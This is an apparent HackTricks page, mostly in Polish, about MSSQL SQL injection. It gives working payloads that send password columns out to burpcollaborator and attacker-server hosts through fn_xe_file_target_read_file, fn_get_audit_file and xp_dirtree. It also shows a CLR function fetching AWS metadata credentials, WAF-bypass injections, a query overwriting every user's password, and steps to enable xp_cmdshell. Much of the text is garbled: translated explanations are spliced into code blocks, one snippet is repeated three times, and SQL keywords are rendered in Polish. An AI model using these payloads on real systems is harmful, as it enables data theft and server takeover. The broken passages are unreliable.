# Wstrzyknicie SQL w MSSQL

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wyliczanie u偶ytkownik贸w Active Directory

Mo偶liwe jest **wyliczenie u偶ytkownik贸w domeny za pomoc wstrzyknicia SQL wewntrz serwera MSSQL**, korzystajc z nastpujcych funkcji MSSQL:

* **`SELECT DEFAULT_DOMAIN()`**: Pobierz nazw bie偶cej domeny.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Jeli znasz nazw domeny (_DOMAIN_ w tym przykadzie), ta funkcja zwr贸ci **SID u偶ytkownika Administratora** w formacie szesnastkowym. Bdzie to wyglda jak `0x01050000000[...]0000f401`, zauwa偶, 偶e **ostatnie 4 bajty** to liczba **500** w formacie **big endian**, kt贸ra jest **wsp贸lnym identyfikatorem u偶ytkownika administratora**.\
Ta funkcja pozwoli ci **pozna ID domeny** (wszystkie bajty opr贸cz ostatnich 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Ta funkcja zwr贸ci **nazw u偶ytkownika dla wskazanego ID** (jeli istnieje), w tym przypadku **0000e803** w formacie big endian == **1000** (zwykle jest to ID pierwszego utworzonego zwykego u偶ytkownika). Mo偶esz sobie wyobrazi, 偶e mo偶esz pr贸bowa siowo ID u偶ytkownik贸w od 1000 do 2000 i prawdopodobnie uzyska wszystkie nazwy u偶ytkownik贸w domeny. Na przykad, korzystajc z funkcji podobnej do tej:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Alternatywne wektory oparte na bdach**

Bdne wstrzyknicia SQL zwykle maj konstrukcje podobne do `+AND+1=@@version--` i wariant贸w opartych na operatorze 芦OR禄. Zapytania zawierajce takie wyra偶enia s zazwyczaj blokowane przez WAFy. Aby je omin, pocz cig znak贸w za pomoc znaku %2b z wynikiem konkretnych wywoa funkcji, kt贸re wywouj bd konwersji typu danych na poszukiwanych danych.

Przykady takich funkcji:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Przykad u偶ycia funkcji `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Te sztuczki SSRF [zostay zaczerpnite std](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Wymaga uprawnienia **`VIEW SERVER STATE`** na serwerze.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Wymaga uprawnienia **`CONTROL SERVER`**.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Wymaga uprawnienia **`CONTROL SERVER`**.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Procedury skadowane takie jak `xp_dirtree`, chocia偶 nie s oficjalnie udokumentowane przez firm Microsoft, zostay opisane przez innych online ze wzgldu na ich przydatno w operacjach sieciowych w MSSQL. Te procedury s czsto wykorzystywane do eksfiltracji danych Out of Band, jak pokazano w r贸偶nych [przykadach](https://www.notsosecure.com/oob-exploitation-cheatsheet/) i [postach](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

Na przykad, procedura skadowana `xp_dirtree` jest u偶ywana do wykonywania 偶da sieciowych, ale jest ograniczona tylko do portu TCP 445. Numer portu nie jest modyfikowalny, ale umo偶liwia odczyt z udzia贸w sieciowych. U偶ycie jest przedstawione w poni偶szym skrypcie SQL:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Warto zauwa偶y, 偶e ta metoda mo偶e nie dziaa na wszystkich konfiguracjach systemu, takich jak `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` dziaajcy na `Windows Server 2016 Datacenter` z domylnymi ustawieniami.

Dodatkowo istniej alternatywne procedury skadowane, takie jak `master..xp_fileexist` i `xp_subdirs`, kt贸re mog osign podobne rezultaty. Wicej informacji na temat `xp_fileexist` mo偶na znale藕 w tym [artykule TechNet](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Oczywicie mo偶na r贸wnie偶 u偶y **`xp_cmdshell`** do **wykonania** czego, co wywoa **SSRF**. Wicej informacji znajduje si w **odpowiednim rozdziale** na stronie:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL Funkcja zdefiniowana przez u偶ytkownika - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Tworzenie funkcji CLR UDF (Common Language Runtime User Defined Function), kt贸ra jest kodem napisanym w dowolnym jzyku .NET i skompilowanym do DLL, aby zosta zaadowany w MSSQL w celu wykonania niestandardowych funkcji, jest procesem, kt贸ry wymaga dostpu `dbo`. Oznacza to, 偶e jest to zazwyczaj wykonalne tylko wtedy, gdy poczenie z baz danych jest nawizywane jako `sa` lub z rol Administratora.

W [tym repozytorium Github](https://github.com/infiniteloopltd/SQLHttp) dostarczono projekt Visual Studio oraz instrukcje instalacji, kt贸re uatwiaj zaadowanie binarnego pliku do MSSQL jako zestawu CLR, umo偶liwiajc tym samym wykonywanie 偶da HTTP GET wewntrz MSSQL.

Rdze tej funkcjonalnoci jest zawarty w pliku `http.cs`, kt贸ry wykorzystuje klas `WebClient` do wykonania 偶dania GET i pobrania zawartoci, jak pokazano poni偶ej:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Przed wykonaniem polecenia SQL `CREATE ASSEMBLY` zaleca si uruchomienie nastpujcego fragmentu kodu SQL, aby doda skr贸t SHA512 zestawu do listy zaufanych zestaw贸w serwera (widocznej za pomoc `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Po pomylnym dodaniu zestawu i utworzeniu funkcji, mo偶na u偶y nastpujcego kodu SQL do wykonywania 偶da HTTP:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **Szybkie wykorzystanie: Pobieranie caej zawartoci tabeli w jednym zapytaniu**

[Sztuczka std](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Zwiza metoda pobierania penej zawartoci tabeli w jednym zapytaniu polega na wykorzystaniu klauzuli `FOR JSON`. Ten podejcie jest bardziej zwize ni偶 u偶ycie klauzuli `FOR XML`, kt贸ra wymaga okrelonego trybu, takiego jak "raw". Klauzula `FOR JSON` jest preferowana ze wzgldu na swoj zwizo.

Oto jak pobra schemat, tabele i kolumny z bie偶cej bazy danych:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
## MSSQL Injection

### Opis

Wstrzykiwanie SQL w systemie zarzdzania baz danych Microsoft SQL Server (MSSQL) polega na wykorzystaniu podatnoci w aplikacji internetowej, kt贸ra umo偶liwia wstrzyknicie kodu SQL do zapyta wykonywanych na bazie danych. 

### Przykad

Poni偶szy przykad demonstruje wstrzykiwanie SQL w aplikacji internetowej, kt贸ra korzysta z bazy danych MSSQL:

```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

### Wyjanienie

W powy偶szym przykadzie, wstrzykiwanie SQL jest wykorzystane w parametrze `id` zapytania HTTP. Fragment `1'+and+1=` jest u偶ywany do zainfekowania zapytania SQL, a nastpnie wykorzystuje si funkcj `concat_ws` do pobrania informacji o schemacie tabeli, nazwie tabeli i nazwie kolumny z bazy danych. 

### Skutki

Wstrzykiwanie SQL w systemie MSSQL mo偶e prowadzi do r贸偶nych skutk贸w, takich jak:

- Ujawnienie poufnych informacji z bazy danych
- Modyfikacja, usuwanie lub dodawanie danych w bazie danych
- Wykonanie dowolnego kodu SQL na serwerze bazy danych

### Zabezpieczenia

Aby zabezpieczy aplikacj przed wstrzykiwaniem SQL w systemie MSSQL, nale偶y zastosowa nastpujce rodki ostro偶noci:

- Wykorzystywa parametryzowane zapytania SQL
- Walidowa i filtrowa dane wejciowe
- Unika dynamicznych zapyta SQL
- U偶ywa mechanizm贸w autoryzacji i uwierzytelniania
- Regularnie aktualizowa oprogramowanie serwera bazy danych
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null

W powy偶szym linku wystpuje atak SQL Injection. Parametr "id" jest podatny na atak. Wstrzyknicie kodu SQL pozwala na wykonanie zoliwego kodu na serwerze bazy danych. W tym przypadku, atakujcy pr贸buje wydoby tekst z tabeli sys.dm_exec_requests i sys.dm_exec_sql_text.
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 懈谢懈 %C2%A0:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--

## Opis

Ten URL zawiera potencjaln podatno na atak SQL Injection. Parametr "id" jest podatny na wstrzyknicie kodu SQL.

## Wykorzystanie

Aby wykorzysta t podatno, mo偶emy u偶y techniki "Union-Based SQL Injection". W tym przypadku, u偶ywamy komendy "UNION SELECT" do pobrania danych z innych tabel w bazie danych.

W powy偶szym URL, u偶ywamy "UNION SELECT null, @@version, null" do pobrania wersji bazy danych.

## Zabezpieczenie

Aby zabezpieczy aplikacj przed atakami SQL Injection, nale偶y stosowa parametryzacj zapyta SQL lub u偶ywa mechanizm贸w ORM (Object-Relational Mapping). Wa偶ne jest r贸wnie偶 sprawdzanie i walidacja danych wejciowych, aby zapobiec wstrzykniciu kodu SQL.
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
## Wstrzyknicie SQL w MSSQL

Wstrzyknicie SQL w aplikacji internetowej opartej na bazie danych MSSQL mo偶e umo偶liwi atakujcemu wykonanie zoliwego kodu SQL. Poni偶ej przedstawiono przykady wstrzyknicia SQL w aplikacji podatnej na atak:

```plaintext
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

W powy偶szych przykadach parametr `id` jest podatny na wstrzyknicie SQL. Atakujcy wykorzystuje operator `UNION` do czenia wynik贸w zapyta SQL. W pierwszym przykadzie u偶ywa si notacji naukowej `0e` przed sowem `union`, a w drugim przykadzie u偶ywa si notacji szesnastkowej `0x`. Nastpnie atakujcy wykorzystuje funkcj `@@version`, aby uzyska informacje o wersji bazy danych MSSQL.

Aby zabezpieczy aplikacj przed wstrzykniciem SQL, nale偶y odpowiednio filtrowa i walidowa dane wejciowe oraz stosowa parametryzowane zapytania SQL.
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--

## Opis

Ten URL zawiera potencjaln podatno na atak SQL Injection. Parametr `id` jest podatny na wstrzyknicie kodu SQL.

## Atak

Atakujcy mo偶e wykorzysta podatno na SQL Injection, aby uzyska wra偶liwe informacje z bazy danych. W tym przypadku, atakujcy pr贸buje wydoby wersj bazy danych MSSQL.

Atakujcy wprowadza `1 union select null,@@version,null from.users--` jako warto parametru `id`. W wyniku zapytania SQL zostanie wykonane poczenie dw贸ch tabel: `null` oraz `@@version`. `@@version` zwr贸ci wersj bazy danych MSSQL.

## Zabezpieczenie

Aby zabezpieczy aplikacj przed atakami SQL Injection, nale偶y skorzysta z parametryzowanych zapyta lub zastosowa mechanizmy filtrowania i walidacji danych wejciowych. W przypadku bazy danych MSSQL, mo偶na r贸wnie偶 ograniczy uprawnienia u偶ytkownika do minimalnego poziomu wymaganego przez aplikacj.
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--

## SQL Injection (Wstrzyknicie SQL)

### MSSQL Injection (Wstrzyknicie MSSQL)

Wstrzyknicie SQL to technika ataku, kt贸ra polega na wstrzykniciu zoliwego kodu SQL do zapytania SQL, kt贸re jest wykonywane przez aplikacj internetow. W przypadku wstrzyknicia MSSQL, atakujcy pr贸buje wykorzysta podatno w aplikacji internetowej, kt贸ra korzysta z bazy danych Microsoft SQL Server (MSSQL).

#### Przykad ataku

Poni偶szy link jest przykadem ataku wstrzyknicia MSSQL:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

W powy偶szym przykadzie, atakujcy pr贸buje wstrzykn kod SQL do parametru `id`. Wstrzyknity kod SQL to `0xunion+select\Nnull,@@version,null+from+users--`. Ten kod SQL ma na celu wywietlenie wersji bazy danych MSSQL.

Aby zabezpieczy aplikacj przed wstrzykniciem MSSQL, nale偶y odpowiednio filtrowa i walidowa dane wejciowe, a tak偶e korzysta z parametryzowanych zapyta SQL.
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

```sql
u偶yj [tempdb]
utw贸rz tabel [test] ([id] int)
wstaw [test] wartoci(1)
wybierz [id] z [test]
usu tabel [test]
```
```

Can be reduced to:

```sql
```sql
U偶yj[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Dodanie bezu偶ytecznego exec() na kocu i sprawienie, 偶e WAF uzna to za nieprawidowe zapytanie
admina'union select 1,'admin','testtest123'exec('select 1')--
## To bdzie:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# U偶ycie dziwnie skonstruowanych zapyta
admin'exec('update[users]set[password]=''a''')--
## To bdzie:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Lub wczenie xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## To bdzie:
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--'
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
